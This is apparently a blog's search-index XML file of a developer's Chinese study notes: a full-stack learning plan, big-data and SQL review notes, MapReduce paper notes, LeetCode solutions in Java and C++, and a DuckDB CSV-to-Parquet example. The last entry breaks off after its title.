<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>定个小目标</title>
      <link href="/2025/02/25/msic/target/"/>
      <url>/2025/02/25/msic/target/</url>
      
        <content type="html"><![CDATA[<p>是时候找好就业方向了, 决定日后成为一名AI时代下牛逼的”全栈开发工程师”，然后我认为自己的目标应该是这样的：  </p><h1 id="1-全栈开发基础能力"><a href="#1-全栈开发基础能力" class="headerlink" title="1.全栈开发基础能力"></a>1.全栈开发基础能力</h1><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><ul><li>核心三件套：HTML5/CSS3（Flex/Grid布局、响应式）、ES6+（模块化、异步编程）</li><li>主流框架：React/Vue/Angular（至少精通一个，掌握状态管理如 Redux/Vuex）</li><li>工程化工具链：Webpack/Vite、Babel、TypeScript、npm/yarn/pnpm</li><li>性能优化：Lighthouse分析、代码分割、懒加载、CDN缓存策略</li></ul><h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><ul><li>Node.js(Express), Python(Django/Flask), Java（Spring Boot）, Rust（Actix Web）</li><li>RESTful API 设计：标准化接口、JWT/OAuth2鉴权、Swagger/OpenAPI文档</li><li>微服务基础：gRPC/GraphQL、服务拆分、基础通信模式 （HTTP/HTTPS、TCP/UDP、WebSocket）</li><li>高并发处理: 异步编程（协程/Promise）、消息队列（RabbitMQ/Kafka）</li></ul><h2 id="数据库与存储"><a href="#数据库与存储" class="headerlink" title="数据库与存储"></a>数据库与存储</h2><ul><li>SQL 数据库：MySQL/PostgreSQL（事务、索引优化、分库分表）</li><li>NoSQL 数据库：MongoDB（聚合管道）、Redis（缓存/分布式锁）</li><li>云存储：AWS S3、阿里云OSS、MinIO自建</li><li>ORM/ODM：Sequelize、TypeORM、Mongoose</li></ul><h2 id="运维与部署"><a href="#运维与部署" class="headerlink" title="运维与部署"></a>运维与部署</h2><ul><li>Linux 基础：Shell脚本、系统监控（htop）、日志分析</li><li>容器化：Docker 镜像优化、Docker Compose 编排</li><li>云服务：AWS/阿里云核心服务（ECS、VPC、负载均衡）</li></ul><h2 id="开发协作"><a href="#开发协作" class="headerlink" title="开发协作"></a>开发协作</h2><ul><li>版本控制：Git 高级操作（rebase、cherry-pick）、Git Flow</li><li>代码质量：ESLint/StyleLint、单元测试（Jest/React Testing Library）</li></ul><h1 id="2-高阶竞争力：拉开差距的关键"><a href="#2-高阶竞争力：拉开差距的关键" class="headerlink" title="2.高阶竞争力：拉开差距的关键"></a>2.高阶竞争力：拉开差距的关键</h1><h2 id="架构设计能力"><a href="#架构设计能力" class="headerlink" title="架构设计能力"></a>架构设计能力</h2><ul><li>云原生架构：Kubernetes 集群管理、Service Mesh（Istio）、Serverless（AWS Lambda）</li><li>可观测性：Prometheus/Grafana 监控、ELK日志体系、分布式追踪（Jaeger）</li><li>安全攻防：OWASP Top 10防护方案、渗透测试工具（Burp Suite）</li></ul><h2 id="工程化深度"><a href="#工程化深度" class="headerlink" title="工程化深度"></a>工程化深度</h2><ul><li>Monorepo 管理：Lerna/Nx、TurboRepo 多包协作</li><li>低代码平台：自研可视化搭建系统、DSL设计</li><li>自动化运维：Ansible/Terraform 基础设施即代码（IaC）</li></ul><h2 id="前沿技术融合"><a href="#前沿技术融合" class="headerlink" title="前沿技术融合"></a>前沿技术融合</h2><ul><li>AI 工程化：LangChain 应用开发、大模型API集成（GPT/Claude）</li><li>边缘计算：CDN边缘函数（Cloudflare Workers）、IoT协议（MQTT）</li><li>Web3 技术栈：Solidity智能合约、IPFS分布式存储</li></ul><h2 id="硬核内功技术"><a href="#硬核内功技术" class="headerlink" title="硬核内功技术"></a>硬核内功技术</h2><ul><li>深入理解类型系统与架构抽象(多写Ocaml和FP锻炼抽象能力)</li><li>扎实的数据结构与算法</li><li>编译优化 + 程序性能优化</li><li>深入了解计算机操作系统(啃下 CSAPP)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>达里奥&lt;&lt;原则&gt;&gt;读书笔记</title>
      <link href="/2025/02/22/msic/principles/"/>
      <url>/2025/02/22/msic/principles/</url>
      
        <content type="html"><![CDATA[<p>梦想+现实+决心=成功的生活</p><h1 id="五步流程实现人生愿望"><a href="#五步流程实现人生愿望" class="headerlink" title="五步流程实现人生愿望"></a>五步流程实现人生愿望</h1><ul><li>有明确的目标。</li><li>找到阻碍你实现这些目标的问题，并且不容忍问题。</li><li>准确诊断问题，找到问题根源。</li><li>规划可以解决问题的方案。</li><li>做一切必要的事来践行这些方案、实现成果。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据知识相关复习</title>
      <link href="/2024/12/15/notes/bigdata/"/>
      <url>/2024/12/15/notes/bigdata/</url>
      
        <content type="html"><![CDATA[<h1 id="构建一个高效的大规模数据系统需要同时考虑-按照重要级别排序-："><a href="#构建一个高效的大规模数据系统需要同时考虑-按照重要级别排序-：" class="headerlink" title="构建一个高效的大规模数据系统需要同时考虑(按照重要级别排序)："></a>构建一个高效的大规模数据系统需要同时考虑(按照重要级别排序)：</h1><ol><li>算法的时间复杂度优化  </li><li>内存, cpu, 网络, io等硬件的使用效率  </li><li>系统资源的合理调度  </li><li>代码的可维护性   </li></ol><h1 id="ETL-Extract-Transform-Load"><a href="#ETL-Extract-Transform-Load" class="headerlink" title="ETL (Extract - Transform - Load)"></a>ETL (Extract - Transform - Load)</h1><p>用来描述数据从源端经过抽取(extract), 转换(transform), 加载(load)至目标端的过程。最耗时间的是<code>transform</code>过程。 </p><h1 id="SQL连接算法"><a href="#SQL连接算法" class="headerlink" title="SQL连接算法"></a>SQL连接算法</h1><ul><li>Nested Loop Join: 嵌套的循环连接, 简单地说就是两层<code>for</code>循环根据条件进行匹配(当然会有索引优化)</li><li>Hash Join: 观察连接条件的字段, 根据其中一个表的字段建立一个buckets, 然后对另外一个表循环与buckets中的值进行条件匹配</li><li>Sort Merge Join: 先对两个表进行排序, 有了排序关系后就可以更加高效的进行连接(类似与双指针的思想, 一个表一个指针, 根据不同条件移动指针)</li></ul><h1 id="SQL窗口函数"><a href="#SQL窗口函数" class="headerlink" title="SQL窗口函数"></a>SQL窗口函数</h1><p>常见函数 <code>row_number</code>, <code>count</code>, <code>sum</code>等等…<br>固定大小rows代表行的固定, range则是窗口内值的固定:  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rows</span> <span class="number">1</span> preceding <span class="number">2</span> following <span class="number">2</span></span><br><span class="line"><span class="keyword">range</span> <span class="number">1</span> preceding <span class="number">2</span> following <span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="SQL递归查询"><a href="#SQL递归查询" class="headerlink" title="SQL递归查询"></a>SQL递归查询</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WITH</span> <span class="keyword">RECURSIVE</span> cte_name (column_list) <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> initial_query_result</span><br><span class="line">    <span class="keyword">UNION</span> [<span class="keyword">ALL</span>]</span><br><span class="line">    <span class="keyword">SELECT</span> recursive_query</span><br><span class="line">    <span class="keyword">FROM</span> cte_name</span><br><span class="line">    <span class="keyword">WHERE</span> <span class="keyword">condition</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> cte_name;</span><br></pre></td></tr></table></figure><h1 id="SQL优化技巧"><a href="#SQL优化技巧" class="headerlink" title="SQL优化技巧"></a>SQL优化技巧</h1><ul><li>深入理解数据, 争取从算法逻辑上优化</li><li>分析每一个计算阶段, 在保证正确性的情况下尽可能使得每一个阶段计算的数据量足够小(过滤无用的数据， 可以用)</li><li>小表驱动大表</li><li>索引优化</li><li>必要时对数据进行分区或者分桶, 提高并行度</li><li>将算子转化到一些高性能的库(可以是Rust的DataFusion, 快手在做这个)<br>总结: 因为计算机所有东西都是由信息组成。于是可以通过信息论进行解释, 消除不确定性, 使得编码所需的空间就更加小了，那么就能提高计算机各方面资源的利用率。我喜欢用信息论去理解性能问题。</li></ul><h1 id="Hadoop-基础"><a href="#Hadoop-基础" class="headerlink" title="Hadoop 基础"></a>Hadoop 基础</h1><p>三大组件:</p><ul><li>hdfs</li><li>mapreduce</li><li>yarn</li></ul><p>hdfs三大角色:     </p><ul><li>NameNode</li><li>DataNode</li><li>SecondNameNode</li></ul><p>hdfs文件格式:  </p><ul><li>Text File (类似csv的行式存储)</li><li>Sequence File (kv序列化存储, 常用于中间数据)</li><li>Avro File (基于行的序列化)</li><li>RC/ORC (列式存储, 支持压缩和切分)</li><li>Parquet (我最喜欢的列式存储, 高压缩)</li></ul><p>文件压缩算法: Gzip、bzip2、LZO、LZ4和Snappy  </p><h1 id="数据仓库-Data-Warehouse"><a href="#数据仓库-Data-Warehouse" class="headerlink" title="数据仓库(Data Warehouse)"></a>数据仓库(Data Warehouse)</h1><p>什么是数据仓库, 其实和数据库的本质相似, 都是<code>数据的集合</code>, 但区别就是所对应数据存储的特点和目的不一样。  </p><p>数据库(database)存下数据的特点: 有组织, 可共享, 尽可能小的冗余<br>数据仓库(data warehouse)下数据的特点:  </p><ul><li>面向主题的(Subject Oriented)</li><li>集成的(Integrated)</li><li>相对稳定的(Non-Volatile)</li><li>反映历史的(Time Variant)</li></ul><p>为什么需要数据仓库?<br>复杂问题分解, 提高复用降低计算成本(空间换时间的思想), 可维护性提升.  </p><h1 id="数据仓库的分层"><a href="#数据仓库的分层" class="headerlink" title="数据仓库的分层"></a>数据仓库的分层</h1><ul><li>ods</li><li>dwd</li><li>dwm</li><li>dws </li><li>apl</li></ul><h1 id="数据库三范式"><a href="#数据库三范式" class="headerlink" title="数据库三范式"></a>数据库三范式</h1><ol><li>原子性, 表中字段的数据不可以再拆分  </li><li>唯一性, 其实就是消除依赖, 一个表只描述一件事情  </li><li>在满足以上2的情况下, 完全消除非主键列的依赖性</li></ol><h1 id="数据倾斜问题"><a href="#数据倾斜问题" class="headerlink" title="数据倾斜问题"></a>数据倾斜问题</h1><p>什么是数据倾斜? 本质上是由于数据分配给各个集群服务器不均匀导致的, 于是就可能出现某台服务器Task运行时间久或者直接OOM(Out Of Memoey).  </p><p>解决: 实现要搞清楚Map过程是不会发生数据倾斜的, 因为 hdfs 都帮我们分成了 128 MB 的 <code>block</code> 保证了每台服务器上数据的均匀分配。发生数据倾斜一般是在 Shuffle 这个过程, 因为这个过程负责混洗和分区, 可能会造成分区到一台机器的数据量就过多了, 也有可能分区到其它机器的数据量极其少。  </p><p>AI的答案:  </p><ul><li>空值处理：在进行表连接时，可以通过过滤或赋予空值新的key值来避免数据倾斜。  </li><li>数据类型统一：在join操作中，确保连接字段的数据类型一致，避免不同数据类型引起的倾斜。  </li><li>大小表连接优化：对于大小表的连接，可以采用map端join，即将小表数据广播到所有节点，避免shuffle操作。  </li><li>两阶段聚合：对于group by操作导致的数据倾斜，可以使用两阶段聚合，即先局部聚合再全局聚合，通过增加随机前缀打散key值。  </li><li>count distinct优化：对于count distinct操作，可以将空值单独处理或使用sum() group by来替代。  </li><li>排序优化：对于排序操作，可以考虑是否只有一个reducer在工作，如果是，则可能需要增加reducer数量或调整策略。  </li></ul><h1 id="其它问题"><a href="#其它问题" class="headerlink" title="其它问题"></a>其它问题</h1><ul><li>MapReduce三个过程?<br>Input Splitting -&gt; Mapping -&gt; Shuffling and Sorting -&gt; Reduce.</li><li>MapReduce中为什么需要 Shuffle?<br>确保下一步能够并行处理(利益最大化), 相同键的键值对分配到同一个Reduce任务中. 排序确保Reduce任务能够按照key的顺序进行处理 </li><li>为什么把任务写入环形内存缓冲区?<br>减少频繁的磁盘I/O操作. 并行处理. </li><li>Hadoop中fsimage和edit的区别是什么？<br>fsimage是静态(历史)的, edit是动态(实时)的.</li><li>Hadoop的Combiner的作用？<br>在Map阶段之后，在数据传输到Reduce阶段之前对Map输出的中间劫夺进行本地合并和压缩，以减少数据的传输量和提高整体的性能。Combiner可以将相同key的多个Map输出结果进行合并，减少了网络传输的数据量.</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode每日一题题解(10月每日更新).</title>
      <link href="/2024/10/11/alog/leetcode/"/>
      <url>/2024/10/11/alog/leetcode/</url>
      
        <content type="html"><![CDATA[<h1 id="3164-优质数对的总数-II-10月11日-枚举"><a href="#3164-优质数对的总数-II-10月11日-枚举" class="headerlink" title="3164. 优质数对的总数 II (10月11日, 枚举)"></a>3164. 优质数对的总数 II (10月11日, 枚举)</h1><p>题目地址: <a href="https://leetcode.cn/problems/find-the-number-of-good-pairs-ii/description/">https://leetcode.cn/problems/find-the-number-of-good-pairs-ii/description/</a><br>思路: 题目要求我们寻找 <code>nums1[i]</code> 可以被 <code>nums2[j] * k</code> 整除的 (i, j)对数, 假如 <code>nums1[i]</code> 可以被 <code>nums2[j] * k</code> 整除, 那么存在一个整数<code>p</code>使得 <code>nums1[i] = nums2[j] * k * p</code> 成立, 所以我们会得出一个第一个非常重要的结论: “<code>nums1[i]</code> 能被 k 整除”。<br>那么 <code>nums1[i] / k</code> 也能被 <code>nums2[j]</code> 整除, 也就是说 <code>nums1[i] / k</code>的因子的某个因子 d == <code>nums2[j]</code>, 于是问题就转化为 对于每一个 <code>(i, j)</code> 里面的 <code>j</code>就代表有多少个 <code>nums1[i] / k</code>的因子能被  <code>nums2[j]</code>所整除.<br>于是大致思路就出来了, 我们先构造一个HashMap, 记录 <code>nums1[i] / k</code> 的每一个因子数量, 然后枚举 nums2, 如果 nums2 能被某个 <code>nums1[i] / k</code>的因子 所整除, 那么对答案的贡献也是那个因子出现的次数(从HashMap取值即可):  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Integer&gt; <span class="title function_">getAllFactors</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; factors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">1</span>;  d * d &lt;= n; d++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % d == <span class="number">0</span>) &#123;</span><br><span class="line">                factors.add(d);</span><br><span class="line">                <span class="keyword">if</span> (d * d != n) &#123;</span><br><span class="line">                    factors.add(n / d);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> factors;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">numberOfPairs</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; cnt = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        IntStream.of(nums1)</span><br><span class="line">            .filter(x -&gt; x % k == <span class="number">0</span>)</span><br><span class="line">            .forEach(x -&gt; &#123;</span><br><span class="line">                List&lt;Integer&gt; factors = getAllFactors(x / k);</span><br><span class="line">                factors.parallelStream().forEach(i -&gt; &#123;</span><br><span class="line">                    cnt.merge(i, <span class="number">1</span>, Integer::sum);</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> IntStream.of(nums2).mapToLong(x -&gt; cnt.getOrDefault(x, <span class="number">0</span>)).sum();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="1884-鸡蛋掉落-两枚鸡蛋-10月13日-DP"><a href="#1884-鸡蛋掉落-两枚鸡蛋-10月13日-DP" class="headerlink" title="1884. 鸡蛋掉落-两枚鸡蛋(10月13日, DP)"></a>1884. 鸡蛋掉落-两枚鸡蛋(10月13日, DP)</h1><p>题目地址: <a href="https://leetcode.cn/problems/egg-drop-with-2-eggs-and-n-floors/">https://leetcode.cn/problems/egg-drop-with-2-eggs-and-n-floors/</a><br>思路: 有两个鸡蛋, 题目给定一个数字<code>n</code>代表整栋楼的高度, 假设仅存在一个数<code>f</code>(0 &lt;= f &lt;= n), 也就是在第 <code>f</code> 层丢鸡蛋不会被丢碎。<br>问怎么用最少的丢蛋次数确定<code>f</code>。<br>由于题目中只有两个鸡蛋, 并且如果一个鸡蛋从某层楼丢下来没有碎的话可以进行重复使用。假设有 n 层楼, 我们在第 i 层楼丢第一个鸡蛋, 分两种情况:  </p><ul><li>如果鸡蛋碎了, 那么我们要在第 (1, 2, … i - 1) 层楼尝试丢第二科鸡蛋才能确定出 <code>f</code>。 也就是需要 1 + (i - 1) = i 步。  </li><li>如果鸡蛋没有碎掉, 我们要往上走继续进行尝试, 那么问题就转化为只有在 n - i 层楼时最少的丢蛋次数 <code>x</code>, 那么就需要 1 + x 步。 </li></ul><p>于是假设 f[n] 为有 n 层楼时的最少的丢蛋次数, 显然 f[0] = 0,<br>对于 <code>n</code> &gt; 0, 状态可以由[1, n]转移过来(从1到n楼中尝试丢蛋时的结果), 由于我们要最优解, 我们对所有状态转移取min, 即对于<code>(1 &lt;= j &lt;= n)</code>, f[n] = min(f[n], max(j, f[n - j] + 1))<br>时间复杂度: O(n^2)  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">twoEggDrop</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> f[n+<span class="number">1</span>];</span><br><span class="line">        f[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            f[i] = INT_MAX;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                f[i] = <span class="built_in">min</span>(f[i], <span class="built_in">max</span>(j, f[i - j] + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">return</span> f[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> alog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My notes of paper &quot; MapReduce Simplified Data Processing on Large Clusters &quot;</title>
      <link href="/2024/03/06/notes/paper_map_reduce/"/>
      <url>/2024/03/06/notes/paper_map_reduce/</url>
      
        <content type="html"><![CDATA[<h1 id="What’s-MapReduce"><a href="#What’s-MapReduce" class="headerlink" title="What’s MapReduce?"></a>What’s MapReduce?</h1><p>A programming model which users can specify a <code>map</code> function that processes a key/value pair to generate a set of intermediate key/value pairs, and a <code>reduce</code> function that merges all intermediate values associated with the same intermediate key.</p><p>The run-time system takes care of the detail of <code>partitioning</code> the input data, scheduling the program’s execution across <code>a set of machines</code>, handling machine failures, and managing the required inter-machine communication.</p><h1 id="Why-MapReduce"><a href="#Why-MapReduce" class="headerlink" title="Why MapReduce?"></a>Why MapReduce?</h1><p>Allow us to express the simple computations we were trying to perform but hides the messy   <code>details of parallelization, fault-tolerance, data distribution and load balancing in a library</code>. </p><h1 id="Programming-Model"><a href="#Programming-Model" class="headerlink" title="Programming Model"></a>Programming Model</h1><p>Expressing the computation as 2 functions: <code>Map</code> and <code>Reduce</code>.  </p><p>Map: takes an input pair and produces a set of intermediate key/value pairs, and then groups together all intermediate values associated with the same intermediate key “I” and passes them to the <code>Reduce</code> function.  </p><p>Reuce: accepts an intermediate key “I” and a set of values for that keys. It merges together these values to form a possibly smaller set of values.  </p><p>types:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">map (k1, v1) -&gt; list(k2, v2)</span><br><span class="line">reduce (k2, list(v2)) -&gt; list(v2)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithms training - 2023 12月 Training plan</title>
      <link href="/2023/12/02/training/202312/"/>
      <url>/2023/12/02/training/202312/</url>
      
        <content type="html"><![CDATA[<h1 id="2023-12月-Training-plan"><a href="#2023-12月-Training-plan" class="headerlink" title="2023 12月 Training plan"></a>2023 12月 Training plan</h1><p>今个月的重点:  </p><ul><li>滑动窗口</li><li>递归</li><li>DP</li></ul><h1 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h1><p><a href="https://leetcode.cn/problems/count-subarrays-where-max-element-appears-at-least-k-times/description/">统计最大元素出现至少 K 次的子数组</a><br>给你一个整数数组 nums 和一个 正整数 k 。<br>请你统计有多少满足 「 nums 中的 最大 元素」至少出现 k 次的子数组，并返回满足这一条件的子数组的数目。<br>子数组是数组中的一个连续元素序列。  </p><p>示例 1：<br>输入：nums = [1,3,2,3,3], k = 2<br>输出：6<br>解释：包含元素 3 至少 2 次的子数组为：[1,3,2,3]、[1,3,2,3,3]、[3,2,3]、[3,2,3,3]、[2,3,3] 和 [3,3]。  </p><p>思路: 首先找到nums中的最大元素mx, 我们要统计子数组的个数可以考虑滑动窗口算法。<br>设置左右指针 l 和 r, 于是我们枚举右指针 r 继续滑动, 途中我们要维护一个 cnt_max 来记录该窗口中最大元素出现的次数。<br>于是我们可以在 cnt_max == k 移动左指针 l, 目的知道 cnt_max != k 为止, 此时 [l, r] 有 k - 1 个最大元素并且 nums[l - 1]一定是最大元素, 于是对答案的贡献就为 l 了。(因为区间运算 l - 1 - 0 + 1, 子数组数量相当于从l - 1到0的每个元素开始到当前区间结束, 也就是 l 次。) </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">using</span> ll = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line">    <span class="function">ll <span class="title">countSubarrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        ll ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> mx = *<span class="built_in">max_element</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> cnt_max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (r &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[r] == mx) cnt_max++;</span><br><span class="line">            <span class="keyword">while</span> (cnt_max == k) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[l] == mx) &#123;</span><br><span class="line">                    cnt_max--;</span><br><span class="line">                &#125;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans += (l - <span class="number">1</span>) - <span class="number">0</span> + <span class="number">1</span>;</span><br><span class="line">            r++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><h1 id="DP"><a href="#DP" class="headerlink" title="DP"></a>DP</h1>]]></content>
      
      
      
        <tags>
            
            <tag> alog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csv to parquet in duckdb. 使用 duckdb将csv文件转为 parquet.</title>
      <link href="/2023/11/02/data/csv2parquet/"/>
      <url>/2023/11/02/data/csv2parquet/</url>
      
        <content type="html"><![CDATA[<p>使用 copy to 语句即可:  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">copy</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> read_csv(<span class="string">&#x27;E:\BigData\fqstockmin2016-2020.csv&#x27;</span>, </span><br><span class="line">    header<span class="operator">=</span><span class="literal">true</span>, columns<span class="operator">=</span>&#123;</span><br><span class="line">        <span class="string">&#x27;stockcode&#x27;</span>: <span class="string">&#x27;VARCHAR&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;contractname&#x27;</span>: <span class="string">&#x27;VARCHAR&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;datestr&#x27;</span>: <span class="string">&#x27;VARCHAR&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;startprice&#x27;</span>: <span class="string">&#x27;DOUBLE&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;maxprice&#x27;</span>: <span class="string">&#x27;DOUBLE&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;minprice&#x27;</span>: <span class="string">&#x27;DOUBLE&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;endprice&#x27;</span>: <span class="string">&#x27;DOUBLE&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;volume&#x27;</span>: <span class="string">&#x27;DOUBLE&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;trademoney&#x27;</span>: <span class="string">&#x27;DOUBLE&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;BIGINT&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;lastdate&#x27;</span>: <span class="string">&#x27;VARCHAR&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;profit&#x27;</span>: <span class="string">&#x27;DOUBLE&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;lastendprice&#x27;</span>: <span class="string">&#x27;DOUBLE&#x27;</span></span><br><span class="line">&#125;)) <span class="keyword">to</span></span><br><span class="line"><span class="string">&#x27;E:\BigData\fqstockmin2016-2020.parquet&#x27;</span> (format <span class="string">&#x27;parquet&#x27;</span>);</span><br></pre></td></tr></table></figure><p>注意时间最好用字符串存, 否则为datetime类型的话spark读取会出现一些错误的时间结果</p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Import csv data to mongodb. MongoDB导入csv文件</title>
      <link href="/2023/10/11/mongodb_import_csv/"/>
      <url>/2023/10/11/mongodb_import_csv/</url>
      
